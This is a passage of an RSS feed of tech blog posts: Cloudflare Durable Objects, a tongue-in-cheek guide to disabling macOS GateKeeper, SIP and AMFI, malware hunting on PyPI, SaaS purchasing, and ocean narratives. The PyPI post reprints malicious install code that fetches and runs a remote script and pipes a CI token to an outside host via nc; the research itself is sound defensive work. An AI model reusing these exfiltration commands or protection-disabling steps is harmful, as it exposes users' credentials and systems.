where, as long as two endpoints share some kind of <strong><em>key</em></strong>, they can pass messages directly (kind of the way WebRTC connections are possible when two computers can't talk directly, but can both talk to a <a href="https://en.wikipedia.org/wiki/Traversal_Using_Relays_around_NAT">TURN server</a>). And it turns out, for Linc to stream live build logs to the browser, that's exactly what we need.</p><h2>The solution</h2><p>We already have an ideal shared key: the git SHA of the current commit being built. We actually use the `tree_id` of the commit, not the commit sha, because a `tree_id` is a hash of <em>only the underlying code</em>, not its history or commit message (an aside: this is how Linc can release instantly when you merge an up-to-date PR, without waiting for a new build).</p><p>The solution has 4 components:</p><figure id="w-node-d2c300e41a9b-86b04042"><p><img src="https://uploads-ssl.webflow.com/5d4b7c4a71ecaf63b7b03f8a/5fae92d434933bbb702fde0a_Cloudflare%20Architecture.png" loading="lazy" alt=""></p></figure><ul role="list"><li>The "normal" Cloudflare <strong>Worker</strong> that receives requests from the client/builder and connects them to the appropriate Object instance.</li><li>The Durable <strong>Object</strong> itself, which maintains a list of current clients, a history of logs, and broadcasts new log entries from the builder to each client.</li><li>The <strong>Builder</strong>, which is the machine in our AWS cluster that runs `npm run fab:build` on the source code. It hasn't needed to change very much, but now sends logs to the Worker as well as saving them to Dynamo. We sometimes call this "build server" or just "server" in the code.</li><li>The <strong>Client</strong>, which is our normal React app, that needs to reconcile "live" logs from the Worker with the existing data from GraphQL.</li></ul><h3>The Worker</h3><p>It's fair to say that this is the piece that I was most confused about after reading the <a href="https://developers.cloudflare.com/workers/learning/using-durable-objects">guide</a>. It feels like you should just be able to deploy the Object itself and talk to it directly, but the Worker layer makes a lot of sense once it fits into the bigger picture: it's the only way <strong><em>clients</em></strong> (who talk HTTP to their nearest edge location) can talk to <strong><em>Object instances</em></strong> (which run in exactly one place worldwide). </p><p>The simplest possible Worker would look like this:</p><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;// Convert our key into a Object ID<br> &nbsp; &nbsp;const id = env.MyObjectNamespace.idFromName('some-fixed-value')<br> &nbsp; &nbsp;// Connect to that instance, booting it if necessary<br> &nbsp; &nbsp;const instance = await env.MyObjectNamespace.get(id)<br> &nbsp; &nbsp;// Forward the current HTTP request to it<br> &nbsp; &nbsp;return instance.fetch(request)<br> &nbsp;}<br>}</p><p>Note that this worker uses a single key for all requests (<em>`'some-fixed-value'`</em>) which means <em>_</em>every<em>_ </em>request would be directed to a <em>_</em>single Object instance<em>_</em>. This is almost certainly not what you want in production, but it was handy when getting started (particularly if you change <em>`'some-fixed-value'` </em>once or twice, so you can be sure you're getting a new instance from the last time you deployed).</p><p>Our Worker isn't actually much more complex, but parses the route to find the <em>`tree_id` </em>to direct all requests for a particular build to a shared instance:</p><div><p>--CODE:language-js--<br>export default {<br> &nbsp;async fetch(request, env) {<br> &nbsp; &nbsp;const { pathname } = new URL(request.url)</p><p> &nbsp; &nbsp;// Pro tip: put the parsing of the route in a static method on the Object so you can use it in both places<br> &nbsp; &nbsp;// (note: the Worker and Object have to be in the same file to share the helper function)<br> &nbsp; &nbsp;const route = DurableBuildLog.toRouteParams(pathname)<br> &nbsp; &nbsp;if (!route.match) return notFound()</p><p> &nbsp; &nbsp;// Validate that the Client has access to this Site's build logs<br> &nbsp; &nbsp;if (route.client) {<br> &nbsp; &nbsp; &nbsp;if (!await clientHasAccess(route.sitename, request.headers)) {<br> &nbsp; &nbsp; &nbsp; &nbsp;return notAuthorized()<br> &nbsp; &nbsp; &nbsp;}<br> &nbsp; &nbsp;}</p><p> &nbsp; &nbsp;// Validate that the Build Server is …</p></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://linc.sh/blog/durable-objects-in-production">https://linc.sh/blog/durable-objects-in-production</a></em></p>]]>
            </description>
            <link>https://linc.sh/blog/durable-objects-in-production</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084470</guid>
            <pubDate>Fri, 13 Nov 2020 17:09:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forbidden Commands to Speed Up macOS]]>
            </title>
            <description>
<![CDATA[
Score 39 | Comments 26 (<a href="https://news.ycombinator.com/item?id=25083934">thread link</a>) | @rubatuga
<br/>
November 13, 2020 | https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/ | <a href="https://web.archive.org/web/*/https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>November 13, 2020<span> · <a href="https://www.naut.ca/blog/tag/macos/">macos</a> <a href="https://www.naut.ca/blog/tag/software/">software</a> <a href="https://www.naut.ca/blog/tag/diy/">diy</a></span></p></div><div><p><img src="https://www.naut.ca/blog/content/images/2020/11/Screen-Shot-2020-11-13-at-2.02.01-AM.jpg" alt="Screen-Shot-2020-11-13-at-2.02.01-AM"><br>
First, ask yourself, would you like to undo a decade of security protections painstakingly created by Apple, protecting your Mac from malware, spyware, and ransomware? What if these so-called <em>protections</em> prevented the normal and speedy usage of your Mac? See exhibits: [<a href="https://news.ycombinator.com/item?id=25074959">A,</a> <a href="https://news.ycombinator.com/item?id=23273247">B,</a> <a href="https://github.com/microsoft/vscode/issues/105446#issuecomment-722264044">C,</a> <a href="https://github.com/johnboiles/obs-mac-virtualcam/wiki/Compatibility#sip-workaround">D,</a> <a href="https://github.com/MacEnhance/MacForge">E,</a> <a href="https://lapcatsoftware.com/articles/unsigned.html">F</a>]</p>
<p>Is that a yes? <strong>Speed and convenience over security any day!</strong> Let us march on boldly 😃! The steps listed below will give you a short description of each protection we disable, and the necessary command in Terminal.</p>
<h4 id="stepbystepguide">Step-by-step Guide</h4>
<p><strong>Step 1: Disable GateKeeper.</strong> This is the part of macOS that deals with code signature validation. It checks if the app in question was signed by the creator, and then checks whether Apple has given the creator a thumbs-up. macOS 10.15 made this much more stringent, requiring Apple to give <em>each app</em> a thumbs-up.</p>
<pre><code>sudo spctl --master-disable
</code></pre>
<p><strong>Step 2: Disable Library Validation.</strong> This protection checks if an app's libraries are signed by Apple or the creator. Until very recently, macOS apps could load code freely from foreign sources called <em>code libraries</em>. With macOS 10.15, apps are no longer allowed to load libraries that weren't originally packaged with it, unless they explicitly allow it.</p>
<pre><code>sudo defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true
</code></pre>
<p><strong>Step 3: Disable System Integrity Protection.</strong> <em>You have to enter Recovery Mode (by holding Command+R while rebooting) in order to disable SIP. This mode lets us change boot data for the Mac.</em> SIP prevents both malware and power-users alike from modifying the system files, core apps, and the kernel of macOS. It does this by only allowing apps and extensions signed by Apple to modify the system.</p>
<pre><code># From the Recovery Mode menubar: Utilities --&gt; Terminal
csrutil disable
</code></pre>
<p><strong>Step 4: Disable Apple Mobile File Integrity.</strong> AMFI is the macOS kernel module that enforces the code-signing validation from Step 1 and the library validation from Step 2. However, even after disabling the services above, AMFI is still checking the signatures of every app that is run, and will cause non-Apple apps to crash when they touch extra-sensitive areas of the system.</p>
<pre><code># While still in Recovery Mode
nvram boot-args="amfi_get_out_of_my_way=1"
</code></pre>
<p><strong>Step 5: Reboot &amp; Enjoy Liberty.</strong> No explanation required.</p>
<h4 id="caveats">Caveats:</h4>
<ul>
<li>If GateKeeper is enabled while AMFI is disabled, some apps will hang while opening.</li>
<li>If AMFI is disabled, prompts to allow apps access to the camera, microphone, accessibility etc. will not be shown. The <code>tccplus</code> utility, found <a href="https://github.com/jslegendre/tccplus">here</a>, alleviates this (there is a GUI script in the repo).</li>
</ul>
<h4 id="furtherreading">Further Reading:</h4>
<ul>
<li><a href="https://knight.sc/reverse%20engineering/2019/02/20/syspolicyd-internals.html">syspolicyd internals</a></li>
<li><a href="https://eclecticlight.co/2019/10/10/how-catalina-handles-app-first-run/">How Catalina handles app first run</a></li>
<li><a href="https://eclecticlight.co/2020/01/27/what-could-possibly-go-wrong-on-an-app-first-run/">What could possibly go wrong on an app first run?</a></li>
<li><a href="https://eclecticlight.co/2018/12/29/amfi-checking-file-integrity-on-your-mac/">AMFI: checking file integrity on your Mac</a></li>
<li><a href="http://www.newosxbook.com/articles/CodeSigning.pdf">Code Signing – Hashed Out, RSA Conference</a></li>
<li><a href="https://secret.club/2020/08/14/macos-entitlements.html">Abusing MacOS Entitlements for code execution</a></li>
</ul>
<h4 id="addendum">Addendum:</h4>
<p>Unfortunately, my article was flagged by some users after getting on the front page of Hacker News! I guess they just didn't appreciate the humour? However, you can check out <a href="https://news.ycombinator.com/item?id=25083934">the discussion</a> before it was taken down.</p>
</div></div>]]>
            </description>
            <link>https://www.naut.ca/blog/2020/11/13/forbidden-commands-to-liberate-macos/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25083934</guid>
            <pubDate>Fri, 13 Nov 2020 16:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hunting for Malicious Packages on PyPI]]>
            </title>
            <description>
<![CDATA[
Score 164 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25081937">thread link</a>) | @mef
<br/>
November 13, 2020 | https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/ | <a href="https://web.archive.org/web/*/https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<article>

<section>
<p><img src="https://jordan-wright.com/blog/images/headers/svg/ossmalware.svg" alt="">
<br>
About a year ago, the Python Software Foundation <a href="https://discuss.python.org/t/what-methods-should-we-implement-to-detect-malicious-content/2240">opened a Request for Information (RFI)</a> to discuss how we could detect malicious packages being uploaded to PyPI. Whether it’s <a href="https://blog.npmjs.org/post/141577284765/kik-left-pad-and-npm">taking over abandoned packages</a>, <a href="https://github.com/dateutil/dateutil/issues/984">typosquatting on popular libraries</a>, or <a href="https://github.com/ChALkeR/notes/blob/master/Gathering-weak-npm-credentials.md">hijacking packages using credential stuffing</a>, it’s clear this is a real issue affecting nearly every package manager.</p>

<p>The truth is that package managers like PyPI are critical infrastructure that almost every company relies on. I could write for days on this topic, but I’ll just let this xkcd suffice for now.</p>
<p><a href="https://xkcd.com/2347/"><img src="https://imgs.xkcd.com/comics/dependency.png" alt="">
</a></p>
<p>This is an area of interest for me, so I responded with <a href="https://gist.github.com/jordan-wright/dfe6236cb4d084aba282239fa9679bc8">my thoughts</a> on how we could approach this. While the entire post is well-cited, beautiful prose that you should go read, one thing stuck with me: considering what happens as soon as a package is installed.</p>
<p>While it might be necessary for some setup activities, things like establishing network connections or executing commands during the <code>pip install</code> process should always be viewed with a 🤨, since it doesn’t give the developer much of a chance to inspect the code before bad things happen.</p>
<p>I wanted to explore this further, so in this post I’m going to walk through how I installed and analyzed every package in PyPI looking for malicious activity.</p>
<h2 id="how-to-find-malicious-libraries">How to Find Malicious Libraries</h2>
<p>To run arbitrary commands during installation, authors typically add code to the <code>setup.py</code> file in their package. You can see some examples in <a href="https://github.com/rsc-dev/pypi_malware/tree/master/malware">this repository</a>.</p>
<p>At a high-level, there are two things you can do to find potentially malicious dependencies: you can look through the code for bad things (static analysis), or you can live dangerously and just install them to see what happens (dynamic analysis).</p>
<p>While static analysis is super interesting (heck, I <a href="https://duo.com/decipher/hunting-malicious-npm-packages">found malicious packages on npm</a> using artisanal <code>grep</code>ing), for this post I’ll focus on dynamic analysis. After all, I think it’s a bit more robust since you’re looking at what <em>actually</em> happens instead of just looking for bad things that could happen.</p>
<p>So what is it we’re actually looking for?</p>
<h3 id="how-important-things-get-done">How Important Things Get Done</h3>
<p>Generally, anytime something important happens it’s done by the kernel. Normal programs (like <code>pip</code>) that want to do important things through the kernel do so through the use of <em>syscalls</em>. Opening files, establishing network connections, and executing commands are all done using syscalls!</p>
<p>You can find more information in this comic from <a href="https://twitter.com/b0rk">Julia Evans</a>:</p>
<blockquote><p lang="en" dir="ltr">system calls <a href="https://t.co/hL91dqbFyq">pic.twitter.com/hL91dqbFyq</a></p>— 🔎Julia Evans🔍 (@b0rk) <a href="https://twitter.com/b0rk/status/989011990092963840?ref_src=twsrc%5Etfw">April 25, 2018</a></blockquote>

<p>This means that if we can watch syscalls during the installation of a Python package, we can see if anything suspicious occurs. The benefit is that it doesn’t matter how obfuscated the code is- we’ll see what actually happens.</p>
<p>It’s important to note that the idea of watching syscalls isn’t something I came up with. Folks like <a href="https://twitter.com/adam_baldwin">Adam Baldwin</a> have been talking about this <a href="https://www.slideshare.net/evilpacket/hunting-for-malicious-modules-in-npm-nodesummit">since 2017</a>. And there was an <a href="https://arxiv.org/pdf/2002.01139.pdf">excellent paper</a> published by researchers from the Georgia Institute of Technology that took this same approach, among others. Honestly, most of this blog post is just trying to reproduce their work.</p>
<p>So we know we want to monitor syscalls - how exactly do we do that?</p>
<h3 id="watching-syscalls-with-sysdig">Watching Syscalls with Sysdig</h3>
<p>There are a number of tools designed to let you watch syscalls. For this project I used <a href="https://github.com/draios/sysdig">sysdig</a> since it provides both structured output and some really nice filtering capabilities.</p>
<p>To make this work, when starting the Docker container that installs the package, I also started a sysdig process that only monitors events from that container. I also filtered out network reads/writes that are going to/from <code>pypi.org</code> or <code>files.pythonhosted.com</code> since I didn’t want to fill the logs with traffic related to package downloads.</p>
<p>With a way to capture syscalls, I had to solve another problem: how to get a list of all PyPI packages.</p>
<h2 id="getting-python-packages">Getting Python Packages</h2>
<p>Fortunately for us, PyPI has an API called the <a href="https://www.python.org/dev/peps/pep-0503/">“Simple API”</a> that can also be thought of as “a very big HTML page with a link to every package” since that’s what it is. It’s simple, clean, and better than any HTML I can probably write.</p>
<p>We can grab this page and parse out all the links using <code>pup</code>, giving us right around 268,000 packages:</p>
<div><pre><code data-lang="text">❯ curl https://pypi.org/simple/ | pup 'a text{}' &gt; pypi_full.txt               

❯ wc -l pypi_full.txt 
  268038 pypi_full.txt</code></pre></div>
<p>For this experiment, I’ll only care about the latest release of each package. It’s possible that there’s malicious versions of packages buried in older releases, but the AWS bill isn’t going to pay itself.</p>
<p>I ended up with a pipeline that looked something like this:</p>

<p>In a nutshell, we’re sending each package name to a set of EC2 instances (I’d love to use Fargate or something in the future but I also don’t know Fargate, so…) which fetches some metadata about the package from PyPI, then starts sysdig as well as a series of containers to <code>pip install</code> the package while syscalls and network traffic were being collected. Then, all of the data is shipped up to S3 for future-Jordan to worry about.</p>
<p>Here’s what this process looks like:</p>

<h2 id="the-results">The Results</h2>
<p>Once this was complete, I had about a terabyte of data sitting in an S3 bucket covering around 245,000 packages. A few packages didn’t have a published version, and some had various processing errors but this felt like a great sample set to work from.</p>
<p>Now for the fun part: <strike>a crapton of grep</strike> ✨ <strong>analysis</strong> ✨.</p>
<p>I merged the metadata and the output, giving me a series of JSON files that looked like this:</p>
<div><pre><code data-lang="json"><span>{</span>
    <span>"metadata"</span><span>:</span> <span>{},</span>
    <span>"output"</span><span>:</span> <span>{</span>
        <span>"dns"</span><span>:</span> <span>[],</span>         <span>//</span> <span>Any</span> <span>DNS</span> <span>requests</span> <span>made</span>
        <span>"files"</span><span>:</span> <span>[],</span>       <span>//</span> <span>All</span> <span>file</span> <span>access</span> <span>operations</span>
        <span>"connections"</span><span>:</span> <span>[],</span> <span>//</span> <span>TCP</span> <span>connections</span> <span>established</span>
        <span>"commands"</span><span>:</span> <span>[],</span>    <span>//</span> <span>Any</span> <span>commands</span> <span>executed</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>I then wrote a series of scripts to start aggregating the data, trying to get a sense of what’s benign and what’s malicious. Let’s dig into some of the results.</p>
<h3 id="network-requests">Network Requests</h3>
<p>There are a number of reasons why a package would need to make a network connection during the installation process. They might need to download legitimate binary components or other resources, they might be a form of analytics, or they may be trying to exfiltrate data or credentials from the system.</p>
<p>The results found 460 packages making network connections to 109 unique hosts. Just like the paper above mentions, quite a few of these are the result of packages sharing a dependency that makes the network connection. It’s possible to filter these out by mapping dependencies, but I haven’t done that here.</p>
<p>For more information, <a href="https://gist.github.com/jordan-wright/c8b273372368ee639dec46b08a93bce1">here’s</a> a breakdown of DNS requests seen during installation.</p>
<h3 id="command-execution">Command Execution</h3>
<p>Like network connections, there are legitimate reasons for packages to run system commands during installation. This could be to compile native binaries, setup the right environment, and more.</p>
<p>Looking across our sample set, 60,725 packages are found to be executing commands during installation. And just like network connections, we have to keep in mind that many of these will be the result of a downstream dependency being the package that runs the commands.</p>
<h2 id="interesting-packages">Interesting Packages</h2>
<p>Digging into the results, most network connections and commands appeared to be legitimate, as expected. But there were a few instances of odd behavior I wanted to call out as case studies to show how useful this type of analysis can be.</p>
<h3 id="i-am-malicious"><code>i-am-malicious</code></h3>
<p>One package called <code>i-am-malicious</code> appears to be a proof-of-concept of a malicious package. Here are the interesting details that give us an idea that the package is worth investigating (if the name weren’t enough 😉):</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
          <span>"name"</span><span>:</span> <span>"gist.githubusercontent.com"</span><span>,</span>
          <span>"addresses"</span><span>:</span> <span>[</span>
            <span>"199.232.64.133"</span>
          <span>]</span>
    <span>}]</span>
  <span>]</span><span>,</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious.py"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/tmp/malicious-was-here"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_TRUNC|O_CREAT|O_WRONLY|O_CLOEXEC"</span>
    <span>},</span>
    <span>...</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"python /tmp/malicious.py"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>We can already get some sense of what’s happening here. We see a connection made to <code>gist.github.com</code>, a Python file being executed, and a file named <code>/tmp/malicious-was-here</code> being created. Sure enough, that’s exactly what’s happening in the <code>setup.py</code>:</p>
<div><pre><code data-lang="python"><span>from</span> <span>urllib.request</span> <span>import</span> <span>urlopen</span>

<span>handler</span> <span>=</span> <span>urlopen</span><span>(</span><span>"https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"</span><span>)</span>
<span>with</span> <span>open</span><span>(</span><span>"/tmp/malicious.py"</span><span>,</span> <span>"wb"</span><span>)</span> <span>as</span> <span>fp</span><span>:</span>
    <span>fp</span><span>.</span><span>write</span><span>(</span><span>handler</span><span>.</span><span>read</span><span>())</span>

<span>import</span> <span>subprocess</span>

<span>subprocess</span><span>.</span><span>call</span><span>([</span><span>"python"</span><span>,</span> <span>"/tmp/malicious.py"</span><span>])</span></code></pre></div>
<p>The <a href="https://gist.githubusercontent.com/moser/49e6c40421a9c16a114bed73c51d899d/raw/fcdff7e08f5234a726865bb3e02a3cc473cecda7/malicious.py"><code>malicious.py</code></a> in question simply adds an “I was here” type message to <code>/tmp/malicious-was-here</code>, suggesting this is indeed a proof-of concept.</p>
<h3 id="maliciouspackage"><code>maliciouspackage</code></h3>
<p>Another self-proclaimed malicious package creatively named <code>maliciouspackage</code> is a bit more nefarious. Here’s the relevant output:</p>
<div><pre><code data-lang="json"><span>{</span>
  <span>"dns"</span><span>:</span> <span>[{</span>
      <span>"name"</span><span>:</span> <span>"laforge.xyz"</span><span>,</span>
      <span>"addresses"</span><span>:</span> <span>[</span>
        <span>"34.82.112.63"</span>
      <span>]</span>
  <span>}],</span>
  <span>"files"</span><span>:</span> <span>[</span>
    <span>{</span>
      <span>"filename"</span><span>:</span> <span>"/app/.git/config"</span><span>,</span>
      <span>"flag"</span><span>:</span> <span>"O_RDONLY"</span>
    <span>},</span>
  <span>],</span>
  <span>"commands"</span><span>:</span> <span>[</span>
    <span>"sh -c apt install -y socat"</span><span>,</span>
    <span>"sh -c grep ci-token /app/.git/config | nc laforge.xyz 5566"</span><span>,</span>
    <span>"grep ci-token /app/.git/config"</span><span>,</span>
    <span>"nc laforge.xyz 5566"</span>
  <span>]</span>
<span>}</span></code></pre></div>
<p>As before, our output gives us a decent idea of what’s going on. In this case, the package appears to extract out a token from the <code>.git/config</code> file and upload it to <code>laforge.xyz</code>. Looking through the <code>setup.py</code>, we see that’s exactly what’s happening:</p>
<div><pre><code data-lang="python"><span>...</span>
<span>import</span> <span>os</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'apt install -y socat'</span><span>)</span>
<span>os</span><span>.</span><span>system</span><span>(</span><span>'grep ci-token /app/.git/config | nc laforge.xyz 5566'</span><span>)</span></code></pre></div>
<h3 id="easyioctl"><code>easyIoCtl</code></h3>
<p>The package <code>easyIoCtl</code> is an interesting one. It claims to give “abstractions away from boring IO operations” but we see the following commands being executed:</p>
<div><pre><code data-lang="bash"><span>[</span>
  <span>"sh -c touch /tmp/testing123"</span>,
  <span>"touch /tmp/testing123"</span>
<span>]</span></code></pre></div>
<p>Suspicious, but not actively harmful. However, this is a <em>perfect</em> example showing the power of tracing syscalls. Here is the relevant code in …</p></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/">https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</a></em></p>]]>
            </description>
            <link>https://jordan-wright.com/blog/post/2020-11-12-hunting-for-malicious-packages-on-pypi/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081937</guid>
            <pubDate>Fri, 13 Nov 2020 13:33:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SaaS Needs a Single Point of Purchase]]>
            </title>
            <description>
<![CDATA[
Score 162 | Comments 153 (<a href="https://news.ycombinator.com/item?id=25081711">thread link</a>) | @alangibson
<br/>
November 13, 2020 | https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html | <a href="https://web.archive.org/web/*/https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div href="/2020/11/13/saas-needs-a-single-point-of-purchase.html">
	<h2>SaaS Needs a Single Point of Purchase</h2>
</div><div>
	<p>The unassailable advantage that big cloud providers like AWS and Azure have over the rest of the SaaS industry isn’t their quality or pace of innovation; it’s that they’re a single point of purchase for a variety of services. If there was a single vendor that large corporations could contract with and pay for SaaS, the big cloud providers market share would have hit its peak.</p>

<p>I can’t overstate the importance of purchasing mechanics in the decision of what SaaS to use inside large corporations. Because of the arcane and complex purchasing requirements you run into, the simple act of buying software is incredibly difficult and time consuming. People who’ve never worked in a BigCo often don’t realize what an unspeakable nightmare it can be. Because, you see, one does not simply put it on the credit card.</p>

<h2 id="a-series-of-unfortunate-events">A Series of Unfortunate Events</h2>

<p>I once spent <em>5 months</em> licensing Jira. We first had to get a quote, even though it’s fixed price, because Purchasing’s rules said you have to have a quote. After we got the quote, we realized we had no way to pay Atlassian because they don’t take POs and we didn’t pay any way but PO. Putting software on your corporate credit card was explicitly forbidden. So we had to engage a reseller to act as an intermediary for no other reason that they could pay with a credit card. Of course they then had to get another quote that eventually expired due to their general incompetence. Rinse and repeat for several more months until we finally got access.</p>

<p>We never licensed another SaaS product, though we had plenty of budget for it. Anything we need, we made it work on AWS tough we’d rather not have the maintenance hassle. We use open source when we’d be willing and able to license a tool simply because no one can bring themselves to relive the Jira nightmare.</p>

<h2 id="a-solution">A Solution</h2>

<p>The SaaS industry needs is a go-to biller where teams inside large corporations could license software under a standing PO. To the company, the entire SaaS industry would then look like a single vendor with many products for sale (just like AWS). Teams would no longer have to think long and hard about whether some new SaaS tool was worth putting the effort in to license, because I can tell you the answer usually ends up being ‘Buh, just make it work with AWS.’</p>

<p>I know there are already aggregators like App Sumo. However, they tend to be based more around bargains. Large companies will certainly take a deal, but it’s not a major driver for them. We paid that reseller I mentioned an extra <em>25%</em> just to use their Visa card.</p>

<p>Obviously this is a big ask. It would require a lot of major players to sign on before even launching. Maybe a non-profit SaaS consortium could make it work. What do you think? Madness or genius?</p>

<p><a href="https://news.ycombinator.com/item?id=25081711">Hacker News Discussion Thread</a></p>


</div></div>]]>
            </description>
            <link>https://landshark.io/2020/11/13/saas-needs-a-single-point-of-purchase.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081711</guid>
            <pubDate>Fri, 13 Nov 2020 13:03:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The “Dying Seas” of the Anthropocene]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 28 (<a href="https://news.ycombinator.com/item?id=25080998">thread link</a>) | @dnetesn
<br/>
November 13, 2020 | http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene | <a href="https://web.archive.org/web/*/http://oceans.nautil.us/feature/637/the-dying-seas-of-the-anthropocene">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p><span>D</span>eclarations that the ocean is dying have become commonplace. We read headlines almost daily telling us that the oceans are choked with plastic, overfished, and rapidly acidifying. Yet even in â€œdying,â€� we are told, the ocean threatens human existence as sea levels rise, sea surface temperatures increase, and commercial fish stocks disappear.&nbsp;</p><p>The ocean has thus become emblematic both of a natural world victimized by humanity and of natureâ€™s possible vengeance. In a 2014 video by the nonprofit organization Conservation International, the growling baritone of the actor Harrison Ford speaks for the ocean: â€œI give. They take. But I can always take back.â€�&nbsp; The message is powerful because it conjures images of both the primordial sea as crucible of life and the biblical flood—destruction of life as punishment for human sin. Yet a vengeful ocean is but one of several historical depictions of the sea, some of which have gained prominence at particular moments while others have faded away. In the 1960s and 1970s many scientists, engineers, and policy makers approached the ocean as a vast but resistant reservoir of untapped natural resources. The hostility of the ocean was understood in the context of national calls for increasing exploitation. US Rear Admiral William C. Hushing, for example, in 1967 described the ocean as â€œhostile in almost every way you can think.â€� In Hushingâ€™s view, the task set for â€œManâ€� was â€œto train himself for the hostilityâ€� and eventually â€œfind ways to convert the hostility to friendliness.â€�&nbsp;</p>
<p>Today, the ocean is increasingly cast as fragile, even as dying. And while the ocean voiced by Harrison Ford remains threatening, the message is that humans are responsible for that threat. We, not the ocean, have taken too much. Once we recognize the increasing dominance of a conception of the ocean as fragile and dying, we are prompted to ask how this shapes conservation efforts and whether it has a net positive or negative influence on marine environmental protection. In the fall of 2016, for example, <em>Outside Magazine </em>published an obituary for the Great Barrier Reef. The article quickly went viral, but coral reef scientists condemned the story as irresponsible. The Great Barrier Reef, they pointed out, although under severe threat, was not yet dead. To declare it lifeless was to give up hope. Environmental pessimism comes at a cost. When pseudoscientific claims gain traction, it is often because they appeal to emotions and long-standing narratives already associated with particular environmental spaces.</p>
<p>Dying-seas narratives and imagery may actually hamper communication between scientists and the public. As an example, Jay Cullen, a researcher at the University of Victoria, leads a project to monitor Fukushima radiation in the eastern Pacific. When Cullenâ€™s lab reported that trace radiation was present off the coast of British Columbia but did not represent a significant health hazard, the response was vociferously angry, including death threats aimed at Cullen. In the case of the Fukushima radiation reports, one publicâ€™s response was to reject scientific claims that did not support the narrative of threatening â€œdying seas.â€� To quote the <em>Globe and Mail: </em>â€œDr. Cullen said he frequently hears from people that his science simply canâ€™t be right because the Pacific Ocean is dying. It is adrift with tsunami debris and plastic waste and its stocks have been overfished, but it has not been killed by nuclear radiation.â€�</p>
<blockquote>Hope, like fear, has power to shape the world we will inhabit.</blockquote>
<p>Although hampering science communication, the dying-seas narrative may also contribute to misguided efforts at environmental restoration. In 2012 a native community on Haida Gwaii paid $2.5 million to an American entrepreneur to carry out an iron-seeding experiment off the coast of British Columbia. The goal was to dump iron dust into the sea to artificially trigger a plankton bloom and restore the local salmon population while also sequestering carbon dioxide. As mentioned earlier, oceanographers pioneered iron-seeding experiments but came to deem the method as too risky for practical use. The Haida Gwaii iron-seeding project was therefore condemned by the international scientific community as having violated two international agreements to place checks on unregulated geoengineering. Yet a lay public that was sold on <em>saving </em>a â€œdying seaâ€� triggered what many in the scientific community saw to be dangerous â€œrogue science.â€� Nor is the 2012 iron-seeding event the only scientifically questionable technological solution marketed as a solution for marine ecological crises. A far more ambitious engineering project to skim microplastics from the North Pacific sea surface is now being tested. The Ocean Cleanup project was founded by a teenage Dutch inventor who, after delivering a viral TEDx speech and raising $2.2 million in crowdsourced funding, dropped out of university to develop his project. Despite concerns voiced by oceanographers that the device will not only be ineffective but will harm pelagic marine creatures, the installation was deployed in late 2018.
On a much smaller scale, millions of dollars have been invested in engineering projects around the world in the Sisyphean task of trying to hold back rising seas as the Greenland and Antarctic ice sheets melt. It may be that future oceanographers, unlike their predecessors, will be less focused on encouragement of widespread collaborative observation and experimentation at sea and more concerned with oversight and restriction of interfering scientific and engineering practices.&nbsp;</p>
<p>Unsurprisingly, the projection of sentience onto the natural world fails to move climate change skeptics. Appeals to safeguard individual charismatic species, like the polar bear, risk critique as devaluing human existence in favor of other forms of life. Descriptions of the earth as a victim of human agency are dismissed by political opponents as scientific hubris. Even publics potentially receptive to conservation science risk being demoralized by imaginative invocation of a vast, â€œdyingâ€� non-human entity. The author of a 2014 editorial in <em>Smithsonian Magazine </em>notes, â€œWeâ€™ve gone from thinking the ocean was too big to hurt, to thinking that the ocean is too big and too sick to help.â€� This cognitive-emotional orientation has been unintentionally fostered by scientists intent on educating a lay public on the importance of global systems thinking. Yet the popularization of this approach to nature has its pitfalls. Conceptualizing the oceans as a cohesive nonhuman entity oversimplifies accounts of environmental degradation and limits understanding of local variability.&nbsp;</p>
